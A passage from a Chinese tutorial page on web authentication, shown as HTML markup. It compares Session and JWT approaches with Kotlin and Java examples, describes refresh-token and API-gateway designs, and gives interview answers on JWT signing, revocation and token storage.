</span><span id="__span-108-14"><a id="__codelineno-108-14" name="__codelineno-108-14" href="#__codelineno-108-14"></a>
</span><span id="__span-108-15"><a id="__codelineno-108-15" name="__codelineno-108-15" href="#__codelineno-108-15"></a><span class="w">        </span><span class="n">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">accessToken</span>
</span><span id="__span-108-16"><a id="__codelineno-108-16" name="__codelineno-108-16" href="#__codelineno-108-16"></a><span class="w">        </span><span class="n">refreshToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">refreshToken</span><span class="w">  </span><span class="c1">// 存储到加密存储</span>
</span><span id="__span-108-17"><a id="__codelineno-108-17" name="__codelineno-108-17" href="#__codelineno-108-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-108-18"><a id="__codelineno-108-18" name="__codelineno-108-18" href="#__codelineno-108-18"></a>
</span><span id="__span-108-19"><a id="__codelineno-108-19" name="__codelineno-108-19" href="#__codelineno-108-19"></a><span class="w">    </span><span class="kd">suspend</span><span class="w"> </span><span class="kd">fun</span><span class="w"> </span><span class="nf">getValidAccessToken</span><span class="p">():</span><span class="w"> </span><span class="kt">String</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-20"><a id="__codelineno-108-20" name="__codelineno-108-20" href="#__codelineno-108-20"></a><span class="w">        </span><span class="c1">// 检查Access Token是否过期</span>
</span><span id="__span-108-21"><a id="__codelineno-108-21" name="__codelineno-108-21" href="#__codelineno-108-21"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isAccessTokenExpired</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-22"><a id="__codelineno-108-22" name="__codelineno-108-22" href="#__codelineno-108-22"></a><span class="w">            </span><span class="c1">// 使用Refresh Token获取新的Access Token</span>
</span><span id="__span-108-23"><a id="__codelineno-108-23" name="__codelineno-108-23" href="#__codelineno-108-23"></a><span class="w">            </span><span class="kd">val</span><span class="w"> </span><span class="nv">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authApi</span><span class="p">.</span><span class="na">refresh</span><span class="p">(</span><span class="n">refreshToken</span><span class="o">!!</span><span class="p">)</span>
</span><span id="__span-108-24"><a id="__codelineno-108-24" name="__codelineno-108-24" href="#__codelineno-108-24"></a><span class="w">            </span><span class="n">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">accessToken</span>
</span><span id="__span-108-25"><a id="__codelineno-108-25" name="__codelineno-108-25" href="#__codelineno-108-25"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-108-26"><a id="__codelineno-108-26" name="__codelineno-108-26" href="#__codelineno-108-26"></a>
</span><span id="__span-108-27"><a id="__codelineno-108-27" name="__codelineno-108-27" href="#__codelineno-108-27"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">accessToken</span><span class="o">!!</span>
</span><span id="__span-108-28"><a id="__codelineno-108-28" name="__codelineno-108-28" href="#__codelineno-108-28"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-108-29"><a id="__codelineno-108-29" name="__codelineno-108-29" href="#__codelineno-108-29"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>优势：</strong>
- Refresh Token长期有效（30-90天）
- 用户体验好，无需频繁登录
- 安全性高（Refresh Token可撤销）</p>
<h3 id="场景4微服务架构jwt统一认证">场景4：微服务架构（JWT统一认证）<a class="headerlink" href="#场景4微服务架构jwt统一认证" title="链接到此标题">&para;</a></h3>
<p><strong>架构：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>┌─────────┐     JWT      ┌──────────────┐
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>│  Client ├─────────────&gt;│ API Gateway  │
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>└─────────┘              │ (验证Token)  │
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a>                         └──────┬───────┘
</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a>                                │ X-User-Id, X-Roles
</span><span id="__span-109-6"><a id="__codelineno-109-6" name="__codelineno-109-6" href="#__codelineno-109-6"></a>                                │ (内部调用不需要Token)
</span><span id="__span-109-7"><a id="__codelineno-109-7" name="__codelineno-109-7" href="#__codelineno-109-7"></a>                ┌───────────────┼───────────────┐
</span><span id="__span-109-8"><a id="__codelineno-109-8" name="__codelineno-109-8" href="#__codelineno-109-8"></a>                │               │               │
</span><span id="__span-109-9"><a id="__codelineno-109-9" name="__codelineno-109-9" href="#__codelineno-109-9"></a>         ┌──────▼──────┐ ┌─────▼─────┐ ┌──────▼──────┐
</span><span id="__span-109-10"><a id="__codelineno-109-10" name="__codelineno-109-10" href="#__codelineno-109-10"></a>         │User Service │ │Order Service│ │Payment Service│
</span><span id="__span-109-11"><a id="__codelineno-109-11" name="__codelineno-109-11" href="#__codelineno-109-11"></a>         └─────────────┘ └──────────────┘ └─────────────┘
</span></code></pre></div></p>
<p><strong>优势：</strong>
- 网关统一验证，减轻微服务压力
- 无状态，易于扩展
- 服务间调用无需Token（内网信任）</p>
<h3 id="场景5混合方案session--jwt">场景5：混合方案（Session + JWT）<a class="headerlink" href="#场景5混合方案session--jwt" title="链接到此标题">&para;</a></h3>
<p><strong>应用场景：</strong>
- 内部员工：Session（频繁操作，需要随时撤销）
- 外部用户：JWT（分布式，跨域访问）</p>
<p><strong>实现：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a><span class="nd">@RestController</span>
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AuthController</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/auth/employee/login&quot;</span><span class="p">)</span>
</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">employeeLogin</span><span class="p">(</span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">LoginRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a><span class="w">        </span><span class="c1">// 内部员工使用Session</span>
</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authenticate</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span><span id="__span-110-8"><a id="__codelineno-110-8" name="__codelineno-110-8" href="#__codelineno-110-8"></a><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-110-9"><a id="__codelineno-110-9" name="__codelineno-110-9" href="#__codelineno-110-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-110-10"><a id="__codelineno-110-10" name="__codelineno-110-10" href="#__codelineno-110-10"></a>
</span><span id="__span-110-11"><a id="__codelineno-110-11" name="__codelineno-110-11" href="#__codelineno-110-11"></a><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/auth/customer/login&quot;</span><span class="p">)</span>
</span><span id="__span-110-12"><a id="__codelineno-110-12" name="__codelineno-110-12" href="#__codelineno-110-12"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">TokenResponse</span><span class="w"> </span><span class="nf">customerLogin</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">LoginRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-110-13"><a id="__codelineno-110-13" name="__codelineno-110-13" href="#__codelineno-110-13"></a><span class="w">        </span><span class="c1">// 外部客户使用JWT</span>
</span><span id="__span-110-14"><a id="__codelineno-110-14" name="__codelineno-110-14" href="#__codelineno-110-14"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authenticate</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span><span id="__span-110-15"><a id="__codelineno-110-15" name="__codelineno-110-15" href="#__codelineno-110-15"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateToken</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-110-16"><a id="__codelineno-110-16" name="__codelineno-110-16" href="#__codelineno-110-16"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenResponse</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-110-17"><a id="__codelineno-110-17" name="__codelineno-110-17" href="#__codelineno-110-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-110-18"><a id="__codelineno-110-18" name="__codelineno-110-18" href="#__codelineno-110-18"></a><span class="p">}</span>
</span></code></pre></div></p>
<hr />
<h2 id="5-常见面试题">5. 常见面试题<a class="headerlink" href="#5-常见面试题" title="链接到此标题">&para;</a></h2>
<h3 id="q1-session和token的区别">Q1: Session和Token的区别？<a class="headerlink" href="#q1-session和token的区别" title="链接到此标题">&para;</a></h3>
<p><strong>回答要点：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>核心区别：
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>1. 存储位置
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a>   - Session：服务器端存储，SessionID在客户端
</span><span id="__span-111-4"><a id="__codelineno-111-4" name="__codelineno-111-4" href="#__codelineno-111-4"></a>   - Token（JWT）：客户端存储，服务器不存储
</span><span id="__span-111-5"><a id="__codelineno-111-5" name="__codelineno-111-5" href="#__codelineno-111-5"></a>
</span><span id="__span-111-6"><a id="__codelineno-111-6" name="__codelineno-111-6" href="#__codelineno-111-6"></a>2. 扩展性
</span><span id="__span-111-7"><a id="__codelineno-111-7" name="__codelineno-111-7" href="#__codelineno-111-7"></a>   - Session：需要Session共享（Redis/Sticky Session）
</span><span id="__span-111-8"><a id="__codelineno-111-8" name="__codelineno-111-8" href="#__codelineno-111-8"></a>   - Token：天然支持分布式，无状态
</span><span id="__span-111-9"><a id="__codelineno-111-9" name="__codelineno-111-9" href="#__codelineno-111-9"></a>
</span><span id="__span-111-10"><a id="__codelineno-111-10" name="__codelineno-111-10" href="#__codelineno-111-10"></a>3. 撤销能力
</span><span id="__span-111-11"><a id="__codelineno-111-11" name="__codelineno-111-11" href="#__codelineno-111-11"></a>   - Session：容易撤销（删除即可）
</span><span id="__span-111-12"><a id="__codelineno-111-12" name="__codelineno-111-12" href="#__codelineno-111-12"></a>   - Token：难撤销（需要黑名单或短期Token）
</span><span id="__span-111-13"><a id="__codelineno-111-13" name="__codelineno-111-13" href="#__codelineno-111-13"></a>
</span><span id="__span-111-14"><a id="__codelineno-111-14" name="__codelineno-111-14" href="#__codelineno-111-14"></a>4. 性能
</span><span id="__span-111-15"><a id="__codelineno-111-15" name="__codelineno-111-15" href="#__codelineno-111-15"></a>   - Session：需要查询存储（Redis/DB）
</span><span id="__span-111-16"><a id="__codelineno-111-16" name="__codelineno-111-16" href="#__codelineno-111-16"></a>   - Token：本地验证签名，更快
</span><span id="__span-111-17"><a id="__codelineno-111-17" name="__codelineno-111-17" href="#__codelineno-111-17"></a>
</span><span id="__span-111-18"><a id="__codelineno-111-18" name="__codelineno-111-18" href="#__codelineno-111-18"></a>5. 适用场景
</span><span id="__span-111-19"><a id="__codelineno-111-19" name="__codelineno-111-19" href="#__codelineno-111-19"></a>   - Session：单体应用、需要频繁撤销
</span><span id="__span-111-20"><a id="__codelineno-111-20" name="__codelineno-111-20" href="#__codelineno-111-20"></a>   - Token：微服务、移动端API、跨域
</span><span id="__span-111-21"><a id="__codelineno-111-21" name="__codelineno-111-21" href="#__codelineno-111-21"></a>
</span><span id="__span-111-22"><a id="__codelineno-111-22" name="__codelineno-111-22" href="#__codelineno-111-22"></a>面试加分项：
</span><span id="__span-111-23"><a id="__codelineno-111-23" name="__codelineno-111-23" href="#__codelineno-111-23"></a>- 提到JWT的三部分结构（Header.Payload.Signature）
</span><span id="__span-111-24"><a id="__codelineno-111-24" name="__codelineno-111-24" href="#__codelineno-111-24"></a>- 说明Refresh Token机制
</span><span id="__span-111-25"><a id="__codelineno-111-25" name="__codelineno-111-25" href="#__codelineno-111-25"></a>- 讲解分布式Session解决方案
</span></code></pre></div></p>
<h3 id="q2-jwt如何防止被篡改">Q2: JWT如何防止被篡改？<a class="headerlink" href="#q2-jwt如何防止被篡改" title="链接到此标题">&para;</a></h3>
<p><strong>回答要点：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>核心机制：数字签名
</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>
</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>1. 签名生成：
</span><span id="__span-112-4"><a id="__codelineno-112-4" name="__codelineno-112-4" href="#__codelineno-112-4"></a>   signature = HMAC-SHA256(header + &quot;.&quot; + payload, secret)
</span><span id="__span-112-5"><a id="__codelineno-112-5" name="__codelineno-112-5" href="#__codelineno-112-5"></a>
</span><span id="__span-112-6"><a id="__codelineno-112-6" name="__codelineno-112-6" href="#__codelineno-112-6"></a>2. 验证过程：
</span><span id="__span-112-7"><a id="__codelineno-112-7" name="__codelineno-112-7" href="#__codelineno-112-7"></a>   - 服务器收到JWT
</span><span id="__span-112-8"><a id="__codelineno-112-8" name="__codelineno-112-8" href="#__codelineno-112-8"></a>   - 重新计算签名：expectedSig = HMAC(header + payload, secret)
</span><span id="__span-112-9"><a id="__codelineno-112-9" name="__codelineno-112-9" href="#__codelineno-112-9"></a>   - 对比：expectedSig == receivedSig
</span><span id="__span-112-10"><a id="__codelineno-112-10" name="__codelineno-112-10" href="#__codelineno-112-10"></a>   - 不匹配则拒绝
</span><span id="__span-112-11"><a id="__codelineno-112-11" name="__codelineno-112-11" href="#__codelineno-112-11"></a>
</span><span id="__span-112-12"><a id="__codelineno-112-12" name="__codelineno-112-12" href="#__codelineno-112-12"></a>3. 为什么安全？
</span><span id="__span-112-13"><a id="__codelineno-112-13" name="__codelineno-112-13" href="#__codelineno-112-13"></a>   - 攻击者没有secret，无法生成有效签名
</span><span id="__span-112-14"><a id="__codelineno-112-14" name="__codelineno-112-14" href="#__codelineno-112-14"></a>   - 修改Payload后签名会失效
</span><span id="__span-112-15"><a id="__codelineno-112-15" name="__codelineno-112-15" href="#__codelineno-112-15"></a>   - 即使Payload是Base64编码可见，但无法伪造
</span><span id="__span-112-16"><a id="__codelineno-112-16" name="__codelineno-112-16" href="#__codelineno-112-16"></a>
</span><span id="__span-112-17"><a id="__codelineno-112-17" name="__codelineno-112-17" href="#__codelineno-112-17"></a>4. 注意事项：
</span><span id="__span-112-18"><a id="__codelineno-112-18" name="__codelineno-112-18" href="#__codelineno-112-18"></a>   - secret必须保密
</span><span id="__span-112-19"><a id="__codelineno-112-19" name="__codelineno-112-19" href="#__codelineno-112-19"></a>   - 建议使用RS256（非对称）替代HS256
</span><span id="__span-112-20"><a id="__codelineno-112-20" name="__codelineno-112-20" href="#__codelineno-112-20"></a>   - 防止算法混淆攻击（alg: none）
</span><span id="__span-112-21"><a id="__codelineno-112-21" name="__codelineno-112-21" href="#__codelineno-112-21"></a>
</span><span id="__span-112-22"><a id="__codelineno-112-22" name="__codelineno-112-22" href="#__codelineno-112-22"></a>面试加分项：
</span><span id="__span-112-23"><a id="__codelineno-112-23" name="__codelineno-112-23" href="#__codelineno-112-23"></a>- 区分对称和非对称签名
</span><span id="__span-112-24"><a id="__codelineno-112-24" name="__codelineno-112-24" href="#__codelineno-112-24"></a>- 提到常见攻击方式和防护
</span><span id="__span-112-25"><a id="__codelineno-112-25" name="__codelineno-112-25" href="#__codelineno-112-25"></a>- 说明密钥管理最佳实践
</span></code></pre></div></p>
<h3 id="q3-jwt如何实现撤销revoke">Q3: JWT如何实现撤销（Revoke）？<a class="headerlink" href="#q3-jwt如何实现撤销revoke" title="链接到此标题">&para;</a></h3>
<p><strong>回答要点：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>问题：JWT无状态，一旦签发就无法撤销
</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>
</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a>解决方案：
</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a>
</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a>1. 黑名单（Blacklist）
</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#__codelineno-113-6"></a>   - 将撤销的jti存储在Redis
</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#__codelineno-113-7"></a>   - 验证时检查是否在黑名单中
</span><span id="__span-113-8"><a id="__codelineno-113-8" name="__codelineno-113-8" href="#__codelineno-113-8"></a>   - 缺点：失去无状态优势
</span><span id="__span-113-9"><a id="__codelineno-113-9" name="__codelineno-113-9" href="#__codelineno-113-9"></a>
</span><span id="__span-113-10"><a id="__codelineno-113-10" name="__codelineno-113-10" href="#__codelineno-113-10"></a>2. 短期Token
</span><span id="__span-113-11"><a id="__codelineno-113-11" name="__codelineno-113-11" href="#__codelineno-113-11"></a>   - Access Token：5-15分钟
</span><span id="__span-113-12"><a id="__codelineno-113-12" name="__codelineno-113-12" href="#__codelineno-113-12"></a>   - 即使泄露，影响时间也很短
</span><span id="__span-113-13"><a id="__codelineno-113-13" name="__codelineno-113-13" href="#__codelineno-113-13"></a>   - 配合Refresh Token使用
</span><span id="__span-113-14"><a id="__codelineno-113-14" name="__codelineno-113-14" href="#__codelineno-113-14"></a>
</span><span id="__span-113-15"><a id="__codelineno-113-15" name="__codelineno-113-15" href="#__codelineno-113-15"></a>3. Refresh Token机制（推荐）
</span><span id="__span-113-16"><a id="__codelineno-113-16" name="__codelineno-113-16" href="#__codelineno-113-16"></a>   - Access Token：短期，不可撤销
</span><span id="__span-113-17"><a id="__codelineno-113-17" name="__codelineno-113-17" href="#__codelineno-113-17"></a>   - Refresh Token：长期，可撤销（存储在DB）
</span><span id="__span-113-18"><a id="__codelineno-113-18" name="__codelineno-113-18" href="#__codelineno-113-18"></a>   - 撤销时删除Refresh Token，Access Token很快过期
</span><span id="__span-113-19"><a id="__codelineno-113-19" name="__codelineno-113-19" href="#__codelineno-113-19"></a>
</span><span id="__span-113-20"><a id="__codelineno-113-20" name="__codelineno-113-20" href="#__codelineno-113-20"></a>4. Token版本号
</span><span id="__span-113-21"><a id="__codelineno-113-21" name="__codelineno-113-21" href="#__codelineno-113-21"></a>   - Payload中包含tokenVersion
</span><span id="__span-113-22"><a id="__codelineno-113-22" name="__codelineno-113-22" href="#__codelineno-113-22"></a>   - 撤销时增加用户的tokenVersion
</span><span id="__span-113-23"><a id="__codelineno-113-23" name="__codelineno-113-23" href="#__codelineno-113-23"></a>   - 验证时对比版本号
</span><span id="__span-113-24"><a id="__codelineno-113-24" name="__codelineno-113-24" href="#__codelineno-113-24"></a>   - 缺点：需要查询数据库
</span><span id="__span-113-25"><a id="__codelineno-113-25" name="__codelineno-113-25" href="#__codelineno-113-25"></a>
</span><span id="__span-113-26"><a id="__codelineno-113-26" name="__codelineno-113-26" href="#__codelineno-113-26"></a>实际选择：
</span><span id="__span-113-27"><a id="__codelineno-113-27" name="__codelineno-113-27" href="#__codelineno-113-27"></a>- 低安全场景：短期Token（最简单）
</span><span id="__span-113-28"><a id="__codelineno-113-28" name="__codelineno-113-28" href="#__codelineno-113-28"></a>- 一般场景：Refresh Token机制
</span><span id="__span-113-29"><a id="__codelineno-113-29" name="__codelineno-113-29" href="#__codelineno-113-29"></a>- 高安全场景：黑名单 + 短期Token
</span><span id="__span-113-30"><a id="__codelineno-113-30" name="__codelineno-113-30" href="#__codelineno-113-30"></a>
</span><span id="__span-113-31"><a id="__codelineno-113-31" name="__codelineno-113-31" href="#__codelineno-113-31"></a>面试加分项：
</span><span id="__span-113-32"><a id="__codelineno-113-32" name="__codelineno-113-32" href="#__codelineno-113-32"></a>- 对比各方案优缺点
</span><span id="__span-113-33"><a id="__codelineno-113-33" name="__codelineno-113-33" href="#__codelineno-113-33"></a>- 说明实际项目中的选择和原因
</span><span id="__span-113-34"><a id="__codelineno-113-34" name="__codelineno-113-34" href="#__codelineno-113-34"></a>- 提到滑动过期策略
</span></code></pre></div></p>
<h3 id="q4-refresh-token的作用和实现原理">Q4: Refresh Token的作用和实现原理？<a class="headerlink" href="#q4-refresh-token的作用和实现原理" title="链接到此标题">&para;</a></h3>
<p><strong>回答要点：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>作用：平衡安全性和用户体验
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>
</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>问题场景：
</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a>- Access Token短期（15分钟）：安全
</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a>- 但用户需要频繁重新登录：体验差
</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a>
</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>解决方案：双Token机制
</span><span id="__span-114-8"><a id="__codelineno-114-8" name="__codelineno-114-8" href="#__codelineno-114-8"></a>
</span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9" href="#__codelineno-114-9"></a>架构：
</span><span id="__span-114-10"><a id="__codelineno-114-10" name="__codelineno-114-10" href="#__codelineno-114-10"></a>Access Token：
</span><span id="__span-114-11"><a id="__codelineno-114-11" name="__codelineno-114-11" href="#__codelineno-114-11"></a>- 有效期：短（5-15分钟）
</span><span id="__span-114-12"><a id="__codelineno-114-12" name="__codelineno-114-12" href="#__codelineno-114-12"></a>- 用途：访问受保护资源
</span><span id="__span-114-13"><a id="__codelineno-114-13" name="__codelineno-114-13" href="#__codelineno-114-13"></a>- 存储：内存或HttpOnly Cookie
</span><span id="__span-114-14"><a id="__codelineno-114-14" name="__codelineno-114-14" href="#__codelineno-114-14"></a>- 不可撤销
</span><span id="__span-114-15"><a id="__codelineno-114-15" name="__codelineno-114-15" href="#__codelineno-114-15"></a>
</span><span id="__span-114-16"><a id="__codelineno-114-16" name="__codelineno-114-16" href="#__codelineno-114-16"></a>Refresh Token：
</span><span id="__span-114-17"><a id="__codelineno-114-17" name="__codelineno-114-17" href="#__codelineno-114-17"></a>- 有效期：长（7-30天）
</span><span id="__span-114-18"><a id="__codelineno-114-18" name="__codelineno-114-18" href="#__codelineno-114-18"></a>- 用途：获取新的Access Token
</span><span id="__span-114-19"><a id="__codelineno-114-19" name="__codelineno-114-19" href="#__codelineno-114-19"></a>- 存储：数据库（可撤销）+ HttpOnly Cookie（客户端）
</span><span id="__span-114-20"><a id="__codelineno-114-20" name="__codelineno-114-20" href="#__codelineno-114-20"></a>- 可撤销
</span><span id="__span-114-21"><a id="__codelineno-114-21" name="__codelineno-114-21" href="#__codelineno-114-21"></a>
</span><span id="__span-114-22"><a id="__codelineno-114-22" name="__codelineno-114-22" href="#__codelineno-114-22"></a>流程：
</span><span id="__span-114-23"><a id="__codelineno-114-23" name="__codelineno-114-23" href="#__codelineno-114-23"></a>1. 登录 → 返回Access Token + Refresh Token
</span><span id="__span-114-24"><a id="__codelineno-114-24" name="__codelineno-114-24" href="#__codelineno-114-24"></a>2. 访问API → 使用Access Token
</span><span id="__span-114-25"><a id="__codelineno-114-25" name="__codelineno-114-25" href="#__codelineno-114-25"></a>3. Access Token过期 → 使用Refresh Token换新Token
</span><span id="__span-114-26"><a id="__codelineno-114-26" name="__codelineno-114-26" href="#__codelineno-114-26"></a>4. Refresh Token过期 → 重新登录
</span><span id="__span-114-27"><a id="__codelineno-114-27" name="__codelineno-114-27" href="#__codelineno-114-27"></a>
</span><span id="__span-114-28"><a id="__codelineno-114-28" name="__codelineno-114-28" href="#__codelineno-114-28"></a>优势：
</span><span id="__span-114-29"><a id="__codelineno-114-29" name="__codelineno-114-29" href="#__codelineno-114-29"></a>- Access Token泄露影响小（很快过期）
</span><span id="__span-114-30"><a id="__codelineno-114-30" name="__codelineno-114-30" href="#__codelineno-114-30"></a>- Refresh Token可撤销（登出、换设备）
</span><span id="__span-114-31"><a id="__codelineno-114-31" name="__codelineno-114-31" href="#__codelineno-114-31"></a>- 用户体验好（长期免登录）
</span><span id="__span-114-32"><a id="__codelineno-114-32" name="__codelineno-114-32" href="#__codelineno-114-32"></a>
</span><span id="__span-114-33"><a id="__codelineno-114-33" name="__codelineno-114-33" href="#__codelineno-114-33"></a>面试加分项：
</span><span id="__span-114-34"><a id="__codelineno-114-34" name="__codelineno-114-34" href="#__codelineno-114-34"></a>- 说明Token轮换（Refresh Token Rotation）
</span><span id="__span-114-35"><a id="__codelineno-114-35" name="__codelineno-114-35" href="#__codelineno-114-35"></a>- 提到Sliding Window策略
</span><span id="__span-114-36"><a id="__codelineno-114-36" name="__codelineno-114-36" href="#__codelineno-114-36"></a>- 讲解移动端的实现差异
</span></code></pre></div></p>
<h3 id="q5-jwt应该存储在哪里为什么">Q5: JWT应该存储在哪里？为什么？<a class="headerlink" href="#q5-jwt应该存储在哪里为什么" title="链接到此标题">&para;</a></h3>
<p><strong>回答要点：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>选项对比：
</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a>
</span><span id="__span-115-3"><a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a>1. localStorage
</span><span id="__span-115-4"><a id="__codelineno-115-4" name="__codelineno-115-4" href="#__codelineno-115-4"></a>   - 优点：使用方便
</span><span id="__span-115-5"><a id="__codelineno-115-5" name="__codelineno-115-5" href="#__codelineno-115-5"></a>   - 缺点：容易被XSS窃取
</span><span id="__span-115-6"><a id="__codelineno-115-6" name="__codelineno-115-6" href="#__codelineno-115-6"></a>   - 结论：不推荐
</span><span id="__span-115-7"><a id="__codelineno-115-7" name="__codelineno-115-7" href="#__codelineno-115-7"></a>
</span><span id="__span-115-8"><a id="__codelineno-115-8" name="__codelineno-115-8" href="#__codelineno-115-8"></a>2. sessionStorage
</span><span id="__span-115-9"><a id="__codelineno-115-9" name="__codelineno-115-9" href="#__codelineno-115-9"></a>   - 优点：关闭标签自动清除
</span><span id="__span-115-10"><a id="__codelineno-115-10" name="__codelineno-115-10" href="#__codelineno-115-10"></a>   - 缺点：仍然容易被XSS窃取
</span><span id="__span-115-11"><a id="__codelineno-115-11" name="__codelineno-115-11" href="#__codelineno-115-11"></a>   - 结论：仅用于临时Token
</span><span id="__span-115-12"><a id="__codelineno-115-12" name="__codelineno-115-12" href="#__codelineno-115-12"></a>
</span><span id="__span-115-13"><a id="__codelineno-115-13" name="__codelineno-115-13" href="#__codelineno-115-13"></a>3. HttpOnly Cookie（推荐）
</span><span id="__span-115-14"><a id="__codelineno-115-14" name="__codelineno-115-14" href="#__codelineno-115-14"></a>   - 优点：JavaScript无法访问，防XSS
</span><span id="__span-115-15"><a id="__codelineno-115-15" name="__codelineno-115-15" href="#__codelineno-115-15"></a>   - 缺点：需要CSRF防护（SameSite）
</span><span id="__span-115-16"><a id="__codelineno-115-16" name="__codelineno-115-16" href="#__codelineno-115-16"></a>   - 结论：最推荐
